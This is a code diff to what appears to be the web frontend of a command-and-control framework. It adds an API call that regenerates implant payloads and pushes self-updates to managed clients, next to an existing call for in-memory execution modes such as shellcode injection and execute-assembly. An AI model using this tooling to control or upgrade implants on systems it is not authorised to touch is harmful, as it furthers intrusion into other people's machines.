@@ -724,6 +724,16 @@ export default {
         return this.batch_delete_clients({ uids: [uid] }).catch(() => {})
     },
 
+    // 客户端升级：重新生成载荷 + self_update（仅独立 EXE payload；需 confirm）
+    upgradeClients(data: { uids: string[]; confirm: boolean; publicHost?: string; publicScheme?: string }) {
+        return request({
+            url: "/client/upgrade",
+            method: "POST",
+            timeout: 300 * 1000, // 逐个生成载荷，耗时较长
+            data,
+        })
+    },
+
     // 内存执行（execute-assembly / inline-bin / shellcode-inject / bof / script / binary / exec-file）
     execute_bin(uid: string, file: File, args: string, mode: string) {
         const formData = new FormData()
